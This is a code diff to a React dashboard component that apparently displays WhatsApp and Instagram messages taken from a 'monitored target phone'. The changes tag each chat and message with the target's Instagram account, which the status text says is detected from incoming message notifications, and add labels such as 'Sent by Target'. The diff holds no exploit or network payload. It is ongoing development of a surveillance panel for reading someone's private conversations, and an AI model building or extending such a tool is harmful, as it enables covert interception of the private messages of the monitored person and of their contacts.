@@ -76,6 +76,7 @@ export interface UnifiedChatSummary {
   totalMessages: number;
   source: "whatsapp" | "instagram";
   isContactOnly?: boolean;
+  targetAccount?: string | null;
 }
 
 export interface UnifiedChatMessage {
@@ -87,6 +88,7 @@ export interface UnifiedChatMessage {
   mediaType?: string | null;
   mediaPath?: string | null;
   reelUrl?: string | null;
+  targetAccount?: string | null;
 }
 
 // ============================================================================
@@ -469,6 +471,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           last_message_at: c.last_message_at || new Date().toISOString(),
           last_message: c.last_message || null,
           last_is_outgoing: Boolean(c.last_is_outgoing),
+          target_account: c.target_account || null,
         });
         seenIgChats.add(key);
       }
@@ -643,13 +646,14 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
       return {
         id: c.chat_name,
         chatName: c.chat_name,
-        subtitle: c.username ? `@${c.username}` : "Instagram Direct",
+        subtitle: c.username ? `@${c.username}` : (c.target_account ? `via @${c.target_account}` : "Instagram Direct"),
         lastMessage: displayLastMsg,
         lastMessageAt: c.last_message_at,
         lastIsOutgoing: c.last_is_outgoing,
         totalMessages: c.total_messages,
         source: "instagram",
         isContactOnly: !hasRealMessage,
+        targetAccount: c.target_account || null,
       };
     });
   }, [instagramChats]);
@@ -1021,6 +1025,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
               mediaType: reelUrl ? "reel" : (isImage ? "image" : m.media_type),
               mediaPath: m.media_path,
               reelUrl: reelUrl,
+              targetAccount: (m as any).target_account || null,
             };
           });
 
@@ -1418,7 +1423,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                   </span>
                   <span>Target Instagram ID</span>
                 </p>
-                <span className="w-2 h-2 rounded-full bg-emerald-500 ring-2 ring-emerald-300 animate-pulse" title="Target Logged In" />
+                <span className={`w-2 h-2 rounded-full ${instagramAccount ? "bg-emerald-500 ring-2 ring-emerald-300 animate-pulse" : "bg-amber-400 ring-2 ring-amber-200"}`} title={instagramAccount ? "Active Account" : "Waiting for message notification"} />
               </div>
               <div className="bg-white/95 border border-pink-200 rounded-lg px-2.5 py-1.5 flex items-center gap-2 shadow-2xs">
                 <div className="w-6 h-6 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 p-[1.5px] shrink-0">
@@ -1428,15 +1433,17 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                 </div>
                 <div className="min-w-0 flex-1">
                   <p className="text-xs font-black text-gray-900 font-mono truncate">
-                    {instagramAccount ? `@${instagramAccount}` : "Detecting..."}
+                    {instagramAccount ? `@${instagramAccount}` : "Waiting for message..."}
                   </p>
-                  <p className="text-[9px] text-emerald-700 font-semibold flex items-center gap-1">
-                    <span>{instagramAccount ? "✓ Logged In" : "⏳ Pending Phone Sync"}</span>
+                  <p className="text-[9px] font-semibold flex items-center gap-1">
+                    <span className={instagramAccount ? "text-emerald-700" : "text-amber-700"}>
+                      {instagramAccount ? "✓ Logged In & Active" : "⏳ Dynamic Notification Detection"}
+                    </span>
                   </p>
                 </div>
               </div>
               <p className="text-[10px] text-pink-800 leading-tight">
-                Active logged-in Instagram account identified on monitored target phone.
+                {instagramAccount ? "Messages and chats are mapped to this active account." : "Target ID is automatically detected from incoming message notifications."}
               </p>
             </div>
           ) : (
@@ -1606,7 +1613,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                               Logged-in Target ID
                             </p>
                             <p className="text-xs font-black text-gray-900 font-mono truncate">
-                              {instagramAccount ? `@${instagramAccount}` : "Waiting for phone sync..."}
+                              {instagramAccount ? `@${instagramAccount}` : "Waiting for message..."}
                             </p>
                           </div>
                         </div>
@@ -1618,7 +1625,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                           <span className={`w-1.5 h-1.5 rounded-full ${
                             instagramAccount ? "bg-emerald-500 animate-pulse" : "bg-amber-500"
                           }`} />
-                          {instagramAccount ? "Online" : "Pending"}
+                          {instagramAccount ? "Online" : "Waiting"}
                         </span>
                       </div>
                       <div className="flex items-center justify-between pt-1 border-t border-pink-200/50 text-[11px] font-semibold text-gray-700">
@@ -1885,6 +1892,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                 ) : (
                                   <span className="text-[9px] font-medium bg-gray-100 text-gray-600 px-1.5 py-0.2 rounded">
                                     {c.totalMessages} {c.totalMessages === 1 ? "msg" : "msgs"}
+                                  </span>
+                                )}
+                                {c.targetAccount && (
+                                  <span className="text-[9px] font-bold bg-pink-100/80 text-pink-800 border border-pink-200 px-1.5 py-0.2 rounded-md">
+                                    @{c.targetAccount}
                                   </span>
                                 )}
                                 <span
@@ -2610,19 +2622,30 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                               : `Received from: ${m.sender || selectedChatSummary.chatName}`}
                                           </span>
                                         </span>
-                                        <span
-                                          className={`text-[9px] font-semibold px-2 py-0.5 rounded-full shrink-0 border ${
-                                            isInstagramMsg
-                                              ? isTargetSent
+                                        <div className="flex items-center gap-1 shrink-0">
+                                          {isInstagramMsg && m.targetAccount && (
+                                            <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded-full border ${
+                                              isTargetSent
                                                 ? "bg-white/20 text-white border-white/30"
-                                                : "bg-pink-50 text-pink-800 border-pink-200"
-                                              : isTargetSent
-                                              ? "bg-emerald-100/90 text-emerald-800 border-emerald-200"
-                                              : "bg-sky-50 text-sky-800 border-sky-200"
-                                          }`}
-                                        >
-                                          {isTargetSent ? "Sent by Target" : "Received from Contact"}
-                                        </span>
+                                                : "bg-purple-100 text-purple-800 border-purple-200"
+                                            }`}>
+                                              @{m.targetAccount}
+                                            </span>
+                                          )}
+                                          <span
+                                            className={`text-[9px] font-semibold px-2 py-0.5 rounded-full shrink-0 border ${
+                                              isInstagramMsg
+                                                ? isTargetSent
+                                                  ? "bg-white/20 text-white border-white/30"
+                                                  : "bg-pink-50 text-pink-800 border-pink-200"
+                                                : isTargetSent
+                                                ? "bg-emerald-100/90 text-emerald-800 border-emerald-200"
+                                                : "bg-sky-50 text-sky-800 border-sky-200"
+                                            }`}
+                                          >
+                                            {isTargetSent ? "Sent by Target" : "Received from Contact"}
+                                          </span>
+                                        </div>
                                       </div>
 
                                       {/* Instagram Reel Link Card */}
